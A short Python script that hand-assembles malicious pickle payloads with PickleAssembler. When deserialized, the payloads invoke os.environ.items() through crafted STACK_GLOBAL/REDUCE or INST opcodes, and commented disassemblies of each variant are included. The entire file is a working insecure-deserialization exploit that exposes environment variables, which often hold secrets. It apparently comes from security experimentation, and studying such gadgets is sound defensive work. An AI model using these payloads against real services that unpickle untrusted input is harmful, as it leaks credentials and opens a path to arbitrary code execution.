"""Different ways to call os.environ.items() in an unrestricted pickler
-- Works"""

import io
import pickle
import pickletools

from pickleassem import PickleAssembler

if __name__ == "__main__":

    pa = PickleAssembler(proto=4)

    # 1. This doesn't work
    # pa.push_short_binunicode("os.environ")
    # pa.push_short_binunicode("items")

    # 2. This works, calls os.environ.items()
    #  0: \x80 PROTO      4
    #  2: \x8c SHORT_BINUNICODE 'os'
    #  6: \x8c SHORT_BINUNICODE 'environ.items'
    # 21: \x93 STACK_GLOBAL
    # 22: (    MARK
    # 23: t        TUPLE      (MARK at 22)
    # 24: R    REDUCE
    # 25: .    STOP

    # pa.push_short_binunicode("os")
    # pa.push_short_binunicode("environ.items")
    # pa.build_stack_global()
    # It takes no arguments
    # pa.push_mark()
    # pa.build_tuple()
    # pa.build_reduce()

    # 3. INST also works
    # 0: \x80 PROTO      4
    # 2: (    MARK
    # 3: i        INST       'os environ.items' (MARK at 2)
    # 21: .    STOP
    pa.push_mark()
    pa.build_inst("os", "environ.items")

    payload = pa.assemble()

    # f = io.BytesIO(payload)
    # print(pickletools.dis(f))

    f = io.BytesIO(payload)
    print(pickle.load(f))
